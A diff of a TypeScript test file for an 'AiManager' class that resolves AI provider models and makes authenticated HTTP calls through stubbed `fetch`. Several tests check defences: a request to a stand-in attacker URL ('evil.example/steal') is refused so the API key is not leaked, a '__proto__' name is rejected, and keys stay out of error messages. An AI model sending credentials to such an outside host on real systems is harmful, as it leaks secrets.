@@ -3,7 +3,7 @@
  *
  * The providers are the mocks of `ai/test` and `fetch` is stubbed for `call()`, so nothing leaves the process.
  */
-import { HitRateLimitError, isNovastarterError, ProviderCallError } from '@novastarter/errors';
+import { HitRateLimitError, InvalidConfigError, isNovastarterError, ProviderCallError } from '@novastarter/errors';
 import { TimeoutError } from '@novastarter/utils';
 import { generateText } from 'ai';
 import { MockEmbeddingModelV4, MockLanguageModelV4, MockProviderV4 } from 'ai/test';
@@ -22,7 +22,7 @@ import { AiManager, type AiProvider } from './ai-manager.js';
  * @returns The mock, typed as a provider.
  */
 const provider = (models?: ConstructorParameters<typeof MockProviderV4>[0]): AiProvider => {
-	// 1. Only the type changes: the mock implements every method the registry calls
+	// Only the type changes: the mock implements every method the registry calls
 	return new MockProviderV4(models) as AiProvider;
 };
 
@@ -33,7 +33,7 @@ const provider = (models?: ConstructorParameters<typeof MockProviderV4>[0]): AiP
  * @returns The mock model.
  */
 const answering = (text: string): MockLanguageModelV4 => {
-	// 1. The smallest result `generateText` accepts: one text part, a finish reason and empty usage
+	// The smallest result `generateText` accepts: one text part, a finish reason and empty usage
 	return new MockLanguageModelV4({
 		doGenerate: {
 			content: [{ type: 'text', text }],
@@ -49,7 +49,6 @@ const answering = (text: string): MockLanguageModelV4 => {
 
 describe('AiManager', () => {
 	test('Resolves a provider:model id to the provider model', () => {
-		// 1. The id names the provider before the colon and its model after
 		const model = answering('hi');
 		const manager = new AiManager();
 
@@ -59,7 +58,6 @@ describe('AiManager', () => {
 	});
 
 	test('Resolves an alias to the model it stands for', () => {
-		// 1. The code asks for a role; the aliases decide which model plays it
 		const chat = answering('hi');
 		const embeddings = new MockEmbeddingModelV4();
 		const manager = new AiManager();
@@ -76,7 +74,7 @@ describe('AiManager', () => {
 	});
 
 	test('Keeps the colons of the model id after the provider name', () => {
-		// 1. Only the first colon separates the provider: fine-tuned and versioned ids carry colons of their own
+		// Only the first colon separates the provider: fine-tuned and versioned ids carry colons of their own
 		const model = answering('hi');
 		const manager = new AiManager();
 
@@ -90,12 +88,11 @@ describe('AiManager', () => {
 
 		manager.registerProvider('mock', provider({ languageModels: { small: answering('hi') } }));
 
-		// 1. Each is a configuration mistake the kit's error names, before the AI SDK registry is asked
+		// Each is a configuration mistake the kit's error names, before the AI SDK registry is asked
 		for (const name of ['chat', ':small', 'mock:', 'other:small']) {
 			expect(() => manager.languageModel(name)).toThrow(AiModelNotFoundError);
 		}
 
-		// 2. An alias pointing at a provider that was never registered fails the same way, naming the alias
 		manager.registerModels({ chat: 'other:small' });
 
 		try {
@@ -110,7 +107,8 @@ describe('AiManager', () => {
 	test('Refuses a provider name the ids could not reach', () => {
 		const manager = new AiManager();
 
-		// 1. The colon separates provider from model, so a name holding one, or an empty name, is refused
+		// The colon separates provider from model, so a name holding one, or an empty name, is refused
+		expect(() => manager.registerProvider('', provider())).toThrow(InvalidConfigError);
 		expect(() => manager.registerProvider('', provider())).toThrow('must be non-empty');
 		expect(() => manager.registerProvider('a:b', provider())).toThrow('must not contain ":"');
 	});
@@ -118,15 +116,14 @@ describe('AiManager', () => {
 	test('Refuses the name __proto__, which the plain records object could not hold', () => {
 		const manager = new AiManager();
 
-		// 1. `providers` and `apis` are plain object literals: `records['__proto__'] = …` invokes the Object.prototype
-		//    setter and swaps the records' prototype instead of storing the provider, so nothing is registered
+		// `providers` and `apis` are plain object literals: `records['__proto__'] = …` invokes the Object.prototype
+		// setter and swaps the records' prototype instead of storing the provider, so nothing is registered
 		expect(() => manager.registerProvider('__proto__', provider())).toThrow('must not be "__proto__"');
 
 		expect(() =>
 			manager.registerProvider('__proto__', provider(), { api: { baseURL: 'https://api.example.com' } }),
 		).toThrow('must not be "__proto__"');
 
-		// 2. Nothing was stored and no prototype was touched: the provider is absent from every lookup
 		const records = (manager as unknown as { providers: object }).providers;
 
 		expect(Object.getPrototypeOf(records)).toBe(Object.prototype);
@@ -140,7 +137,6 @@ describe('AiManager', () => {
 		const second = answering('second');
 		const manager = new AiManager();
 
-		// 1. The registry is built once and kept while the providers stay the same
 		manager.registerProvider('mock', provider({ languageModels: { small: first } }));
 
 		const registry = manager.registry();
@@ -148,7 +144,6 @@ describe('AiManager', () => {
 		expect(manager.registry()).toBe(registry);
 		expect(manager.languageModel('mock:small')).toBe(first);
 
-		// 2. A replacement under the same name is seen at once
 		manager.registerProvider('mock', provider({ languageModels: { small: second } }));
 
 		expect(manager.registry()).not.toBe(registry);
@@ -159,13 +154,11 @@ describe('AiManager', () => {
 		const manager = new AiManager();
 		const models = { chat: 'mock:small' } as const;
 
-		// 1. A second registration replaces rather than merges, like a second bootstrap
 		manager.registerModels(models);
 		manager.registerModels({ smart: 'mock:large' });
 
 		expect(manager.models()).toStrictEqual({ smart: 'mock:large' });
 
-		// 2. What goes in and what comes out are copies, so neither side changes the other
 		const out = manager.models() as Record<string, string>;
 
 		out['smart'] = 'mock:other';
@@ -176,7 +169,6 @@ describe('AiManager', () => {
 	test('Lists the registered providers', () => {
 		const manager = new AiManager();
 
-		// 1. Names in registration order; an inherited key is not a provider
 		manager.registerProvider('openai', provider());
 		manager.registerProvider('anthropic', provider());
 
@@ -188,7 +180,6 @@ describe('AiManager', () => {
 	test('Hands generateText a model that answers', async () => {
 		const manager = new AiManager();
 
-		// 1. End to end through the AI SDK: the resolved model is what `generateText` calls
 		manager.registerProvider('mock', provider({ languageModels: { small: answering('Hello!') } }));
 		manager.registerModels({ chat: 'mock:small' });
 
@@ -212,7 +203,6 @@ const KEY = 'sk-secret-key-123';
  * @returns The mock, whose calls are the requests.
  */
 const stubFetch = (status: number, body?: unknown, headers: Record<string, string> = {}): ReturnType<typeof vi.fn> => {
-	// 1. A text body as is, anything else as JSON, none for `undefined`
 	let text: string | null = null;
 
 	if (typeof body === 'string') {
@@ -221,7 +211,7 @@ const stubFetch = (status: number, body?: unknown, headers: Record<string, strin
 		text = JSON.stringify(body);
 	}
 
-	// 2. A fresh `Response` per request, since a body can be read only once
+	// A fresh `Response` per request, since a body can be read only once
 	const fetchMock = vi.fn(async () => new Response(text, { status, headers }));
 
 	vi.stubGlobal('fetch', fetchMock);
@@ -240,7 +230,7 @@ const requestOf = (
 	fetchMock: ReturnType<typeof vi.fn>,
 	index = 0,
 ): { url: string; method: string; headers: Record<string, string>; body: unknown } => {
-	// 1. `httpCall` calls `fetch(url, init)` with plain-object headers
+	// `httpCall` calls `fetch(url, init)` with plain-object headers
 	const [url, init] = fetchMock.mock.calls[index] as [string, RequestInit];
 
 	return {
@@ -258,7 +248,6 @@ const requestOf = (
  * @returns What it threw.
  */
 const failure = async (run: () => Promise<unknown>): Promise<Error> => {
-	// 1. A call that succeeds is a failed test
 	try {
 		await run();
 	} catch (error) {
@@ -270,7 +259,6 @@ const failure = async (run: () => Promise<unknown>): Promise<Error> => {
 
 describe('AiManager.call', () => {
 	afterEach(() => {
-		// 1. Every test stubs its own `fetch`
 		vi.unstubAllGlobals();
 	});
 
@@ -280,7 +268,6 @@ describe('AiManager.call', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. The path goes under the base URL, the params into the query, the answer comes back parsed
 		const { data } = await manager.call('openai', 'GET /v1/models', { limit: 2 });
 
 		expect(data).toStrictEqual({ data: [{ id: 'gpt-5-mini' }] });
@@ -304,7 +291,6 @@ describe('AiManager.call', () => {
 			},
 		});
 
-		// 1. The provider's own scheme, no Authorization header, and the caller's beta header added
 		await manager.call(
 			'anthropic',
 			'POST /v1/messages/count_tokens',
@@ -338,7 +324,6 @@ describe('AiManager.call', () => {
 
 		manager.registerProvider('proxy', provider(), { api: { baseURL: 'https://gateway.example.com/openai/v1' } });
 
-		// 1. A proxy's root path stays in front of the call's path; a 204 has nothing to parse
 		await expect(manager.call('proxy', 'DELETE /files/file-1')).resolves.toMatchObject({
 			status: 204,
 			data: undefined,
@@ -355,13 +340,12 @@ describe('AiManager.call', () => {
 			api: { baseURL: 'https://api.openai.com', apiKey: KEY, allowedHosts: ['*.openai.example'] },
 		});
 
-		// 1. The base's host and a wildcard subdomain are the provider's own
 		await manager.call('openai', 'GET https://api.openai.com/v1/models');
 		await manager.call('openai', 'GET https://files.openai.example/v1/x');
 
 		expect(fetchMock).toHaveBeenCalledTimes(2);
 
-		// 2. Any other host would receive the key, so it is refused without a request
+		// Any other host would receive the key, so it is refused without a request
 		const error = await failure(() => manager.call('openai', 'GET https://evil.example/steal'));
 
 		expect(error.message).toContain('not on a host of this provider');
@@ -375,7 +359,7 @@ describe('AiManager.call', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. An unknown verb or a relative path is ambiguous, so nothing is sent
+		// An unknown verb or a relative path is ambiguous, so nothing is sent
 		await expect(manager.call('openai', 'FETCH /v1/models')).rejects.toThrow('is not');
 		await expect(manager.call('openai', 'GET v1/models')).rejects.toThrow('neither a path');
 		expect(fetchMock).not.toHaveBeenCalled();
@@ -388,7 +372,6 @@ describe('AiManager.call', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. The provider's status and answer are kept; the key is not in the message
 		const error = await failure(() => manager.call('openai', 'GET /v1/models'));
 
 		expect(error).toBeInstanceOf(ProviderCallError);
@@ -410,7 +393,6 @@ describe('AiManager.call', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. The caller may try again once the provider's wait is over
 		const error = await failure(() => manager.call('openai', 'GET /v1/models'));
 
 		expect(error).toBeInstanceOf(HitRateLimitError);
@@ -422,7 +404,7 @@ describe('AiManager.call', () => {
 	});
 
 	test('Uses the call timeout over the API timeout', async () => {
-		// 1. A `fetch` that answers only when aborted, so the deadline decides
+		// A `fetch` that answers only when aborted, so the deadline decides
 		vi.stubGlobal(
 			'fetch',
 			vi.fn(
@@ -439,7 +421,6 @@ describe('AiManager.call', () => {
 			api: { baseURL: 'https://api.openai.com', apiKey: KEY, timeout: 60_000 },
 		});
 
-		// 2. The call's 20 ms wins over the API's minute
 		const error = await failure(() => manager.call('openai', 'GET /v1/models', {}, { timeout: 20 }));
 
 		expect(error).toBeInstanceOf(TimeoutError);
@@ -450,7 +431,6 @@ describe('AiManager.call', () => {
 		const fetchMock = stubFetch(200, {});
 		const manager = new AiManager();
 
-		// 1. A typo in the name fails with the package's error, before any request
 		const error = await failure(() => manager.call('openai', 'GET /v1/models'));
 
 		expect(error).toBeInstanceOf(AiProviderNotFoundError);
@@ -462,19 +442,19 @@ describe('AiManager.call', () => {
 		const fetchMock = stubFetch(200, {});
 		const manager = new AiManager();
 
-		// 1. Without an API there is no base URL or key to call with
+		// Without an API there is no base URL or key to call with
 		manager.registerProvider('openai', provider());
 
 		await expect(manager.call('openai', 'GET /v1/models')).rejects.toThrow(
 			'call() needs registerProvider(name, provider, { api: { baseURL, … } })',
 		);
 
-		// 2. A replacement without an API does not keep the old one's credentials
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 		manager.registerProvider('openai', provider());
 
 		const error = await failure(() => manager.call('openai', 'GET /v1/models'));
 
+		expect(error).toBeInstanceOf(InvalidConfigError);
 		expect(error.message).toContain('registered without an API');
 		expect(error.message).not.toContain(KEY);
 		expect(fetchMock).not.toHaveBeenCalled();
@@ -483,7 +463,11 @@ describe('AiManager.call', () => {
 	test('Refuses an API whose baseURL is not an http(s) URL, without quoting it', () => {
 		const manager = new AiManager();
 
-		// 1. A bad base URL fails at start-up rather than on the first call; the URL may carry a key, so it is not quoted
+		// A bad base URL fails at start-up rather than on the first call; the URL may carry a key, so it is not quoted
+		expect(() =>
+			manager.registerProvider('openai', provider(), { api: { baseURL: `api.openai.com?k=${KEY}` } }),
+		).toThrow(InvalidConfigError);
+
 		expect(() =>
 			manager.registerProvider('openai', provider(), { api: { baseURL: `api.openai.com?k=${KEY}` } }),
 		).toThrow('needs a "baseURL" that is an http(s) URL');
@@ -500,7 +484,6 @@ describe('AiManager.call', () => {
 		const manager = new AiManager();
 		const api = { baseURL: 'https://api.openai.com', headers: { 'x-api-key': KEY } };
 
-		// 1. The headers changed after registration are not the ones sent
 		manager.registerProvider('openai', provider(), { api });
 		api.headers['x-api-key'] = 'changed';
 
@@ -512,7 +495,6 @@ describe('AiManager.call', () => {
 
 describe('AiManager.call placeholders and answers', () => {
 	afterEach(() => {
-		// 1. Every test stubs its own `fetch`
 		vi.unstubAllGlobals();
 	});
 
@@ -522,11 +504,9 @@ describe('AiManager.call placeholders and answers', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. A GET: the placeholder takes `id`, URL-encoded; the other parameters stay in the query
 		await manager.call('openai', 'GET /v1/files/{id}', { id: 'a/b', limit: 5 });
 		expect(requestOf(fetchMock).url).toBe('https://api.openai.com/v1/files/a%2Fb?limit=5');
 
-		// 2. A POST: the placeholder's parameter is not in the body
 		await manager.call('openai', 'POST /v1/batches/{id}/cancel', { id: 'batch_1', reason: 'x' });
 		expect(requestOf(fetchMock, 1).url).toBe('https://api.openai.com/v1/batches/batch_1/cancel');
 		expect(requestOf(fetchMock, 1).body).toBe('{"reason":"x"}');
@@ -538,7 +518,7 @@ describe('AiManager.call placeholders and answers', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. Sent, it would reach the provider as `%7Bid%7D`
+		// Sent as is, the placeholder would reach the provider as `%7Bid%7D`
 		await expect(manager.call('openai', 'GET /v1/files/{id}')).rejects.toThrow(/"id" parameter/);
 		expect(fetchMock).not.toHaveBeenCalled();
 	});
@@ -550,7 +530,6 @@ describe('AiManager.call placeholders and answers', () => {
 
 		manager.registerProvider('openai', provider(), { api: { baseURL: 'https://api.openai.com', apiKey: KEY } });
 
-		// 1. Status, headers and body, typed as a `CallResponse`
 		const answer = await manager.call<{ ok: boolean }>('openai', 'GET /v1/models');
 
 		expect(answer.status).toBe(200);
